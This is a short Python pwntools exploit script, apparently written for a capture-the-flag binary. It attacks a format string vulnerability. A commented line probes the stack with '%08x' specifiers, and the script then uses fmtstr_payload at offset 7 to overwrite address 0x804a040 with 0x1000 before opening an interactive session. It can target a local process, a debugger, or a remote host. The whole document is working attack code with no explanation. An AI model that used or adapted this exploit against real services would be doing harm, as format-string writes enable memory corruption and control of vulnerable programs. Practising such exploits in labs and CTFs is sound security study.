#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")

context.binary = e

def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            
            """)
    elif cond == 3:
        r = remote("addr", 1337)

    return r


def main():
    r = conn(1)

    # r.send(b"A"*4 + b".%08x"*0x20)
    offset = 7
    target = 0x804a040

    writeTo = {target : 0x1000}

    payload = fmtstr_payload(offset, writeTo)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()